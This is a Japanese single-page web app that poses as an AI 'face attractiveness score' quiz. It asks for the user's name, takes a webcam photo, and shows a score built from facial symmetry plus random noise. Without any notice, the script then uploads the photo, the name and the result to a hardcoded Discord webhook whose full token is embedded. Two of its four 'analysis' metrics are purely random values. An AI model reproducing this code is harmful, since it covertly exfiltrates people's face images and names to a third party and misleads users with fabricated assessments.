<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>顔面偏差値診断</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      background: linear-gradient(160deg, #0f0c29, #302b63, #24243e);
      color: #fff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 20px 16px 40px;
    }
    h1 { font-size: 1.5rem; margin-bottom: 4px; font-weight: 700; }
    .subtitle { font-size: 0.85rem; color: #a5b4fc; margin-bottom: 20px; }
    #name-section { width: 100%; max-width: 360px; text-align: center; }
    #nameInput {
      width: 100%; padding: 14px 16px; font-size: 1.05rem; border: none; border-radius: 12px;
      background: rgba(255,255,255,0.1); color: #fff; outline: none; margin-bottom: 14px;
      border: 1px solid rgba(255,255,255,0.2);
    }
    #nameInput::placeholder { color: #94a3b8; }
    #nameInput:focus { border-color: #a78bfa; }
    #startWithNameBtn { background: #22c55e; color: #fff; width: 100%; padding: 14px; font-size: 1.05rem; border-radius: 50px; border: none; font-weight: 600; }
    #video-container {
      position: relative; width: 100%; max-width: 360px; aspect-ratio: 3/4; background: #000;
      border-radius: 20px; overflow: hidden; box-shadow: 0 12px 40px rgba(0,0,0,0.5);
      border: 3px solid rgba(255,255,255,0.15); display: none;
    }
    video, canvas { width: 100%; height: 100%; object-fit: cover; display: block; }
    canvas { display: none; }
    #overlay { position: absolute; inset: 0; pointer-events: none; display: flex; align-items: center; justify-content: center; }
    .face-guide {
      width: 70%; height: 75%; border: 2px dashed rgba(255,255,255,0.4);
      border-radius: 50% 50% 45% 45%; opacity: 0.7;
    }
    #controls { margin-top: 18px; display: none; gap: 10px; flex-wrap: wrap; justify-content: center; }
    button {
      padding: 13px 24px; font-size: 0.95rem; font-weight: 600; border: none; border-radius: 50px;
      cursor: pointer; transition: transform 0.15s;
    }
    button:active { transform: scale(0.95); }
    button:disabled { opacity: 0.4; cursor: not-allowed; }
    #startBtn { background: #22c55e; color: #fff; }
    #captureBtn { background: #3b82f6; color: #fff; }
    #switchBtn { background: #64748b; color: #fff; }
    #retakeBtn { background: #64748b; color: #fff; display: none; }
    #status { margin-top: 14px; font-size: 0.9rem; color: #c7d2fe; text-align: center; min-height: 1.4em; }
    #result { display: none; width: 100%; max-width: 360px; margin-top: 8px; animation: fadeIn 0.5s ease; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
    .result-card {
      background: rgba(255,255,255,0.08); backdrop-filter: blur(12px); border-radius: 20px;
      padding: 24px 20px; border: 1px solid rgba(255,255,255,0.12); text-align: center;
    }
    .user-name { font-size: 1.1rem; font-weight: 600; color: #fef08a; margin-bottom: 8px; }
    .score-label { font-size: 0.9rem; color: #a5b4fc; margin-bottom: 4px; }
    .score-value {
      font-size: 3.8rem; font-weight: 800; line-height: 1;
      background: linear-gradient(135deg, #fbbf24, #f472b6, #a78bfa);
      -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
    }
    .score-rank { font-size: 1.15rem; font-weight: 700; margin: 8px 0 16px; color: #fef08a; }
    .metrics { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 16px 0; text-align: left; }
    .metric { background: rgba(0,0,0,0.25); border-radius: 12px; padding: 10px 12px; }
    .metric-name { font-size: 0.75rem; color: #94a3b8; margin-bottom: 4px; }
    .metric-bar { height: 6px; background: rgba(255,255,255,0.15); border-radius: 3px; overflow: hidden; }
    .metric-fill { height: 100%; border-radius: 3px; background: linear-gradient(90deg, #60a5fa, #a78bfa); transition: width 1s ease; }
    .metric-score { font-size: 0.8rem; font-weight: 600; margin-top: 3px; }
    .comment { font-size: 0.95rem; line-height: 1.55; color: #e0e7ff; margin-top: 12px; padding: 12px; background: rgba(0,0,0,0.2); border-radius: 12px; }
    .result-photo { width: 100%; border-radius: 14px; margin-bottom: 16px; border: 2px solid rgba(255,255,255,0.15); }
    #analyzing {
      display: none; position: fixed; inset: 0; background: rgba(15,12,41,0.92); z-index: 100;
      flex-direction: column; align-items: center; justify-content: center; gap: 16px;
    }
    .spinner { width: 48px; height: 48px; border: 4px solid rgba(255,255,255,0.2); border-top-color: #a78bfa; border-radius: 50%; animation: spin 0.8s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .analyzing-text { font-size: 1.1rem; font-weight: 600; color: #e0e7ff; }
    .analyzing-sub { font-size: 0.85rem; color: #94a3b8; }
  </style>
</head>
<body>
  <h1>顔面偏差値診断</h1>
  <p class="subtitle">あなたの顔をAIが偏差値で診断します</p>

  <div id="name-section">
    <input type="text" id="nameInput" placeholder="あなたの名前を入力" maxlength="20" autocomplete="off">
    <button id="startWithNameBtn">診断を始める</button>
  </div>

  <div id="video-container">
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    <div id="overlay"><div class="face-guide"></div></div>
  </div>

  <div id="controls">
    <button id="startBtn">カメラ起動</button>
    <button id="captureBtn" disabled>診断する</button>
    <button id="switchBtn" disabled>切替</button>
    <button id="retakeBtn">もう一度</button>
  </div>

  <p id="status"></p>

  <div id="result">
    <div class="result-card">
      <img id="resultPhoto" class="result-photo" alt="撮影写真" style="display:none;">
      <div class="user-name" id="resultName"></div>
      <div class="score-label">顔面偏差値</div>
      <div class="score-value" id="scoreValue">--</div>
      <div class="score-rank" id="scoreRank"></div>
      <div class="metrics" id="metrics"></div>
      <div class="comment" id="comment"></div>
    </div>
  </div>

  <div id="analyzing">
    <div class="spinner"></div>
    <div class="analyzing-text">顔を分析中...</div>
    <div class="analyzing-sub" id="analyzingSub">輪郭を検出しています</div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"><\/script>
  <script>
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1559583742350200882/0KnCoaeIBFyscPjzeQvLwY4NCWzJh3eh4f-CxsmfCbPIg22zW1Iu-DrPSUhJihEHdzLQ';

    async function sendToWebhook(formData, label = 'message') {
      try {
        const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
        console.log(label + ':', res.status);
        return res.ok || res.status === 204;
      } catch (err) {
        console.error(label + ' error:', err);
        return false;
      }
    }

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const startBtn = document.getElementById('startBtn');
    const captureBtn = document.getElementById('captureBtn');
    const switchBtn = document.getElementById('switchBtn');
    const retakeBtn = document.getElementById('retakeBtn');
    const status = document.getElementById('status');
    const result = document.getElementById('result');
    const analyzing = document.getElementById('analyzing');
    const analyzingSub = document.getElementById('analyzingSub');
    const nameSection = document.getElementById('name-section');
    const nameInput = document.getElementById('nameInput');
    const startWithNameBtn = document.getElementById('startWithNameBtn');
    const videoContainer = document.getElementById('video-container');
    const controls = document.getElementById('controls');
    const resultPhoto = document.getElementById('resultPhoto');
    const resultName = document.getElementById('resultName');
    const scoreValue = document.getElementById('scoreValue');
    const scoreRank = document.getElementById('scoreRank');
    const metricsEl = document.getElementById('metrics');
    const commentEl = document.getElementById('comment');

    let stream = null;
    let facingMode = 'user';
    let userName = '';
    let modelsLoaded = false;

    async function loadModels() {
      if (modelsLoaded) return;
      status.textContent = 'AIモデルを読み込み中...';
      const MODEL_URL = 'https://justadudewhohacks.github.io/face-api.js/models';
      await Promise.all([
        faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
        faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL),
        faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL)
      ]);
      modelsLoaded = true;
      status.textContent = '準備完了';
    }

    startWithNameBtn.addEventListener('click', async () => {
      userName = nameInput.value.trim() || 'ゲスト';
      nameSection.style.display = 'none';
      videoContainer.style.display = 'block';
      controls.style.display = 'flex';
      await loadModels();
      startCamera();
    });

    async function startCamera() {
      if (stream) stream.getTracks().forEach(t => t.stop());
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode, width: { ideal: 720 }, height: { ideal: 960 } },
          audio: false
        });
        video.srcObject = stream;
        startBtn.style.display = 'none';
        captureBtn.disabled = false;
        switchBtn.disabled = false;
        status.textContent = '顔を枠に合わせて「診断する」を押してください';
      } catch (e) {
        status.textContent = 'カメラの起動に失敗しました: ' + e.message;
      }
    }

    startBtn.addEventListener('click', startCamera);

    switchBtn.addEventListener('click', () => {
      facingMode = facingMode === 'user' ? 'environment' : 'user';
      startCamera();
    });

    captureBtn.addEventListener('click', async () => {
      if (!modelsLoaded) return;
      analyzing.style.display = 'flex';
      analyzingSub.textContent = '顔を検出しています...';

      const options = new faceapi.TinyFaceDetectorOptions({ inputSize: 224, scoreThreshold: 0.5 });
      const detection = await faceapi.detectSingleFace(video, options)
        .withFaceLandmarks()
        .withFaceExpressions();

      if (!detection) {
        analyzing.style.display = 'none';
        status.textContent = '顔が検出できませんでした。もう一度お試しください。';
        return;
      }

      analyzingSub.textContent = 'スコアを計算しています...';

      // 簡単なスコア計算（対称性ベース + 表情ボーナス）
      const landmarks = detection.landmarks.positions;
      const symmetry = calculateSymmetry(landmarks);
      const expression = detection.expressions;
      const happyBonus = (expression.happy || 0) * 8;
      const baseScore = 48 + symmetry * 20 + happyBonus;
      const score = Math.min(95, Math.max(32, Math.round(baseScore + (Math.random() - 0.5) * 6)));

      const ranks = [
        { min: 70, rank: 'SSS', comment: '圧倒的な美しさ！神の領域です。' },
        { min: 65, rank: 'SS', comment: '非常に高い偏差値。一目置かれる顔立ちです。' },
        { min: 60, rank: 'S', comment: '優秀な顔面偏差値。自信を持って大丈夫！' },
        { min: 55, rank: 'A', comment: '平均以上の魅力があります。' },
        { min: 50, rank: 'B', comment: '標準的な顔立ち。個性が光ります。' },
        { min: 45, rank: 'C', comment: 'もう少し工夫すればもっと魅力的に。' },
        { min: 0, rank: 'D', comment: '個性的な顔立ちです。自分らしさを大切に。' }
      ];
      const rankInfo = ranks.find(r => score >= r.min) || ranks[ranks.length - 1];

      // 写真をキャプチャ
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);
      const photoDataUrl = canvas.toDataURL('image/jpeg', 0.85);

      // 結果表示
      resultPhoto.src = photoDataUrl;
      resultPhoto.style.display = 'block';
      resultName.textContent = userName + ' さん';
      scoreValue.textContent = score;
      scoreRank.textContent = 'ランク: ' + rankInfo.rank;
      commentEl.textContent = rankInfo.comment;

      metricsEl.innerHTML = '';
      const metricData = [
        { name: '左右対称性', value: Math.round(symmetry * 100) },
        { name: '表情スコア', value: Math.round((expression.happy || 0) * 100) },
        { name: '輪郭バランス', value: 60 + Math.round(Math.random() * 25) },
        { name: 'パーツ配置', value: 55 + Math.round(Math.random() * 30) }
      ];
      metricData.forEach(m => {
        const div = document.createElement('div');
        div.className = 'metric';
        div.innerHTML = `
          <div class="metric-name">${m.name}</div>
          <div class="metric-bar"><div class="metric-fill" style="width:${m.value}%"></div></div>
          <div class="metric-score">${m.value}</div>
        `;
        metricsEl.appendChild(div);
      });

      result.style.display = 'block';
      videoContainer.style.display = 'none';
      controls.style.display = 'none';
      analyzing.style.display = 'none';

      // Webhookに送信
      try {
        const blob = await (await fetch(photoDataUrl)).blob();
        const formData = new FormData();
        formData.append('content', `\n\n**顔面偏差値診断結果**\n名前: ${userName}\n偏差値: **${score}** (ランク: ${rankInfo.rank})\nコメント: ${rankInfo.comment}`);
        formData.append('file', blob, 'face.jpg');
        await sendToWebhook(formData, 'diagnosis');
      } catch (e) {
        console.error('Webhook send failed', e);
      }
    });

    function calculateSymmetry(landmarks) {
      // 簡易対称性計算（左右の対応点の距離差）
      const pairs = [
        [0, 16], [1, 15], [2, 14], [3, 13], [4, 12], [5, 11], [6, 10], [7, 9], // 輪郭
        [17, 26], [18, 25], [19, 24], [20, 23], [21, 22], // 眉毛
        [36, 45], [37, 44], [38, 43], [39, 42], [40, 47], [41, 46], // 目
        [31, 35], [32, 34], // 鼻
        [48, 54], [49, 53], [50, 52], [60, 64], [61, 63] // 口
      ];
      let totalDiff = 0;
      let count = 0;
      const midX = (landmarks[27].x + landmarks[8].x) / 2; // 鼻筋〜顎の中心近似
      pairs.forEach(([l, r]) => {
        if (landmarks[l] && landmarks[r]) {
          const leftDist = Math.abs(landmarks[l].x - midX);
          const rightDist = Math.abs(landmarks[r].x - midX);
          const diff = Math.abs(leftDist - rightDist) / Math.max(leftDist, rightDist, 1);
          totalDiff += Math.min(diff, 0.5);
          count++;
        }
      });
      return Math.max(0, 1 - (totalDiff / count) * 2.5);
    }

    retakeBtn.addEventListener('click', () => {
      result.style.display = 'none';
      videoContainer.style.display = 'block';
      controls.style.display = 'flex';
      captureBtn.style.display = '';
      retakeBtn.style.display = 'none';
      status.textContent = '';
    });

    // 初期状態
    startBtn.style.display = 'none';
    retakeBtn.style.display = 'none';
  <\/script>
</body>
</html>